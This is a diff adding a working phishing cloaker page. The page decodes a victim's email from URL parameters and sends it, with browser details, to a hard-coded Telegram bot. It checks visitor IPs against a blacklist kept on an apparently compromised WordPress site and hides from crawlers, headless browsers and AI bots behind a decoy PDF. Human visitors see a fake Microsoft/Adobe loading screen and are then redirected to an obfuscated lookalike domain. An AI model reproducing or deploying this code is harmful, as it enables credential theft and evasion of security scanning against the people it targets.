@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloaking Example</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+            color: #07090F;
+            line-height: 1.42857143;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100vh; /* Full height */
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="content"></div>
+
+    <script>
+        const blacklistedWords = [
+            
+        'google', 'microsoft', 'crawl','python','curl',
+        'Amazonbot','Applebot','Applebot-Extended','Bytespider',
+        'CCBot','ChatGPT-User','Claude-Web','ClaudeBot','Diffbot',
+        'FacebookBot','FriendlyCrawler','GPTBot','Google-Extended',
+        'GoogleOther','GoogleOther-Image','GoogleOther-Video','ICC-Crawler',
+        'ImagesiftBot','Meta-ExternalAgent','Meta-ExternalFetcher','OAI-SearchBot',
+        'PerplexityBot','PetalBot','Scrapy','Timpibot','VelenPublicWebCrawler',
+        'Webzio-Extended','YouBot','anthropic-ai','cohere-ai','facebookexternalhit',
+        'img2dataset','omgili','omgilibot'];
+
+    const allowedParamPattern = /^Sachiel\d$/;
+    const allowedParamPattern2 = /^Azrael\d$/;
+    var checkCountry = false;
+    var Country = "";
+
+    let combinedResult = ''; // Declare a variable to hold the combined result
+function getBase64FromUrl() {
+    const url = window.location.href;
+    const urlObj = new URL(url);
+
+    const utmSource = decodeURIComponent(urlObj.searchParams.get('SIKA'));
+    const utmDevice = decodeURIComponent(urlObj.searchParams.get('TUMI'));
+
+    let decodedSource = '';
+    let extractedSource = '';
+    let decodedDevice = '';
+    let extractedDevice = '';
+
+    // Process utm_source
+    if (utmSource) {
+        const base64Part = utmSource.replace(/^info\d{0,3}/, '');
+        if (isBase64(base64Part)) {
+            try {
+                decodedSource = atob(base64Part);
+            } catch (error) {
+                console.error('Failed to decode Base64 string in utm_source:', error);
+                decodedSource = 'Error decoding Base64 string in utm_source.';
+            }
+        } else {
+            extractedSource = base64Part;
+        }
+    } else {
+        extractedSource = 'utm_source parameter not found.';
+    }
+
+    // Process utm_device
+    if (utmDevice) {
+        const base64PartDevice = utmDevice.replace(/^pills\d{0,3}/, '');
+        if (isBase64(base64PartDevice)) {
+            try {
+                decodedDevice = atob(base64PartDevice);
+            } catch (error) {
+                console.error('Failed to decode Base64 string in utm_device:', error);
+                decodedDevice = 'Error decoding Base64 string in utm_device.';
+            }
+        } else {
+            extractedDevice = base64PartDevice;
+        }
+    } else {
+        extractedDevice = 'utm_device parameter not found.';
+    }
+
+    // Combine decoded or extracted values without extra spaces
+    const combinedSource = decodedSource || extractedSource;
+    const combinedDevice = decodedDevice || extractedDevice;
+    combinedResult = [combinedSource, combinedDevice].filter(Boolean).join('@');
+
+    // No longer displaying the combined result immediately
+    // You can log it or do something else if needed for debugging
+    return combinedResult;
+}
+
+// Function to check if a string is Base64 encoded
+function isBase64(str) {
+    try {
+        return btoa(atob(str)).replace(/=/g, '') === str.replace(/=/g, '');
+    } catch (err) {
+        return false;
+    }
+}
+
+function sendMessage(email) {
+  const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
+  const chatId = '1412104349';
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const userDetails = {
+    Client_Email: getBase64FromUrl(),
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    screenSize: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth,
+    timestamp: new Date().toISOString(),
+  };
+
+  // Format userDetails into a readable string
+  const formattedDetails = `
+*User Details:*
+- *Client Email*: ${userDetails.Client_Email}
+- *User Agent*: ${userDetails.userAgent}
+- *Language*: ${userDetails.language}
+- *Screen Size*: ${userDetails.screenSize}
+- *Color Depth*: ${userDetails.colorDepth}
+- *Timestamp*: ${userDetails.timestamp}
+  `;
+
+  const data = {
+    chat_id: chatId,
+    text: formattedDetails,
+    parse_mode: 'Markdown', // Use Markdown to format the message nicely in Telegram
+  };
+
+  // Use the fetch API to make a POST request to the Telegram Bot API
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+  })
+    .then(response => response.json())
+    .then(result => {
+      console.log('Message sent successfully:', result);
+    })
+    .catch(error => {
+      console.error('Error sending message:', error);
+    });
+}
+
+function sendMessage2(email) {
+  const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
+  const chatId = '1412104349';
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const userDetails = {
+    Client_Emails: "Incoming Bot",
+    Client_Email: getBase64FromUrl(),
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    screenSize: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth,
+    timestamp: new Date().toISOString(),
+  };
+
+  // Format userDetails into a readable string
+  const formattedDetails = `
+*User Details:*
+- *Client Email*: ${userDetails.Client_Emails}
+- *Client Email*: ${userDetails.Client_Email}
+- *User Agent*: ${userDetails.userAgent}
+- *Language*: ${userDetails.language}
+- *Screen Size*: ${userDetails.screenSize}
+- *Color Depth*: ${userDetails.colorDepth}
+- *Timestamp*: ${userDetails.timestamp}
+  `;
+
+  const data = {
+    chat_id: chatId,
+    text: formattedDetails,
+    parse_mode: 'Markdown', // Use Markdown to format the message nicely in Telegram
+  };
+
+  // Use the fetch API to make a POST request to the Telegram Bot API
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+  })
+    .then(response => response.json())
+    .then(result => {
+      console.log('Message sent successfully:', result);
+    })
+    .catch(error => {
+      console.error('Error sending message:', error);
+    });
+}
+
+
+
+    function fetchIPInfo() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const param = urlParams.get('Amethyst');
+        const para = urlParams.get('Chamuel');
+        if (!allowedParamPattern.test(param) || !allowedParamPattern2.test(para)) {
+            console.log('Invalid parameter. Redirecting to error page...');
+            fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+                .then(response => response.json())
+                .then(data => {
+                    var ip = data.ip;
+                    addBlacklistedIP(ip);
+                    redirectToBlockedPage();
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            return;
+        }
+
+        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                var hostname = data.hostname || '';
+                console.log('IP Address:', ip);
+                console.log('Hostname:', hostname);
+                // Check if hostname contains any blacklisted words
+                if (blacklistedWords.some(word => hostname.includes(word))) {
+                    console.log('Hostname contains a blacklisted word. Adding IP to blacklist...');
+                    addBlacklistedIP(ip);
+                    redirectToBlockedPage();
+                // } else if ((data.privacy && data.privacy.vpn) || (checkCountry && data.country && data.country !== Country)) {
+                //     console.log('IP ' + ip + ' is using a VPN or not from the allowed country. Adding to blacklist...');
+                //     // Add IP to blacklist database
+                //     addBlacklistedIP(ip);
+                //     redirectToBlockedPage();
+                } else {
+                    console.log('IP ' + ip + ' is not using a VPN and from the allowed country.');
+                    // Check if IP is blacklisted
+                    checkBlacklistedIP(ip);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    }
+    function redirectToBlockedPage() {
+        document.getElementById('content').innerHTML = `
+            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
+                This browser does not support PDFs. Please download the PDF to view it: 
+                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
+            </iframe>
+        `;
+    }
+
+    function addBlacklistedIP(ip) {
+        // Check if IP is already in the blacklist
+        fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
+            .then(response => response.text())
+            .then(data => {
+                if (data !== 'blacklisted') {
+                    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: 'ip=' + ip
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log(data); // Log the response
+                        // You can handle the response here (e.g., display a message to the user)
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        redirectToBlockedPage();
+                    });
+                } else {
+                    console.log('IP ' + ip + ' is already in the blacklist.');
+                    redirectToBlockedPage();
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                redirectToBlockedPage();
+            });
+    }
+
+
+    function checkBlacklistedIP(ip) {
+    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
+        .then(response => response.text())
+        .then(data => {
+            if (data === 'blacklisted') {
+                console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
+                sendMessage2(getBase64FromUrl());
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();
+
+            } else if (data === 'clean') {
+                console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
+                sendMessage(getBase64FromUrl());
+                loadContent();
+            } else {
+                console.log('Error:', data);
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+}
+
+    const botUserAgents = [
+            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
+            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
+            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
+            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
+            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
+            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
+            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
+            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
+            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
+            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
+            'img2dataset', 'omgili', 'omgilibot'
+        ];
+
+        // Function to detect the User-Agent
+        function detectUserAgent() {
+            const userAgent = navigator.userAgent;
+            return botUserAgents.some(bot => userAgent.includes(bot));
+        }
+
+        // Function to detect a specific query parameter
+        function detectQueryParameter(paramName) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.has(paramName) ? urlParams.get(paramName) : null;
+        }
+
+        // Function to load content based on user agent and query parameter
+        function loadContent() {
+    const isBot = detectUserAgent();
+    const paramValue = detectQueryParameter('Bd');
+
+    if (isBot) {
+        window.location.href = "block.html";
+    } else if (paramValue) {
+        const script = document.createElement('script');
+        script.innerHTML = `
+            function isHuman() {
+                const userAgent = navigator.userAgent.toLowerCase();
+                const botUserAgents = [
+                    'Googlebot', 'Bingbot', 'Yahoo! Slurp', 'DuckDuckBot',
+                    'Baiduspider', 'YandexBot', 'Sogou', 'Exabot', 'facebot',
+                    'ia_archiver', 'python', 'curl', 'bot', 'spider', 'crawl'
+                ];
+                const isBot = botUserAgents.some(bot => userAgent.includes(bot));
+                const headlessChecks = [
+                    () => /HeadlessChrome/.test(userAgent),
+                    () => navigator.webdriver,
+                    () => window.outerWidth === 0 && window.outerHeight === 0,
+                    () => navigator.languages === "" || navigator.plugins.length === 0
+                ];
+                const isHeadless = headlessChecks.some(check => check());
+                return !isBot && !isHeadless;
+            }
+
+function verifyAndRedirect() {
+    if (isHuman()) {
+        function getQueryParameter(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        function isBase64(str) {
+            try {
+                return btoa(atob(str)) === str;
+            } catch (err) {
+                return false;
+            }
+        }
+
+        const paramValue = getQueryParameter('EIP');
+        let finalValue;
+
+        if (paramValue && isBase64(paramValue)) {
+            finalValue = atob(paramValue);
+            window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+finalValue);
+        } else {
+            finalValue = paramValue;
+            window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+finalValue);
+        }
+    } else {
+        window.location.href = "File not found.html";
+    }
+}
+
+
+            setTimeout(verifyAndRedirect, 3000);
+        `;
+        document.getElementById('content').innerHTML = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Loading Example</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(to bottom right, #ffffff, #f8f8f8);
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            transition: background 0.3s ease;
+        }
+
+        .loading-screen {
+            background: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            position: relative;
+        }
+
+        .logos {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .feds-brand-image img {
+            width: 50px; /* Smaller size for the Adobe logo */
+            height: auto;
+            margin-right: 20px; /* More space between logos */
+        }
+
+        .logo {
+            width: 90px; /* Larger size for Microsoft logo */
+            height: auto;
+        }
+
+        .loader {
+            border: 6px solid #e0e0e0;
+            border-top: 6px solid #e60000;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1.5s linear infinite;
+            margin: 20px 0;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .connecting-message {
+            font-size: 16px;
+            margin-top: 5px;
+            opacity: 0;
+            animation: fade-in 1s forwards;
+        }
+
+        @keyframes fade-in {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        /* Button styling */
+        .button {
+            background-color: #e60000; /* Red button */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+            transition: background 0.3s ease;
+        }
+
+        .button:hover {
+            background-color: #d50000; /* Darker red on hover */
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 600px) {
+            .connecting-message {
+                font-size: 14px; /* Smaller font on mobile */
+            }
+            .loader {
+                width: 40px;
+                height: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="loading-screen" class="loading-screen">
+        <div class="logos">
+            <a href="https://www.adobe.com/" class="feds-brand" daa-ll="Brand">
+                <span class="feds-brand-image">
+                    <img loading="lazy" src="https://www.adobe.com/federal/assets/svgs/adobe-logo.svg" alt="Adobe, Inc.">
+                </span>
+            </a>
+            <img class="logo" src="https://acctcdn.msftauth.net/images/microsoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg" role="img" alt="Microsoft">
+        </div>
+        <div class="loader"></div>
+        <p class="connecting-message">Connecting to Microsoft...</p>
+        <button class="button" style="display: none;">Cancel</button> <!-- Optional cancel button -->
+    </div>
+    <div id="app-content" class="app-content" style="display: none;">
+        <h2>Your Document</h2>
+        <p>Your document content goes here...</p>
+    </div>
+</body>
+</html>
+
+    `;
+        document.body.appendChild(script);
+    } else {
+        document.getElementById('content').innerHTML = `
+            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
+                This browser does not support PDFs. Please download the PDF to view it: 
+                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
+            </iframe>
+        `;
+    }
+}
+        fetchIPInfo();
+    </script>
+    
+</body>
+</html>
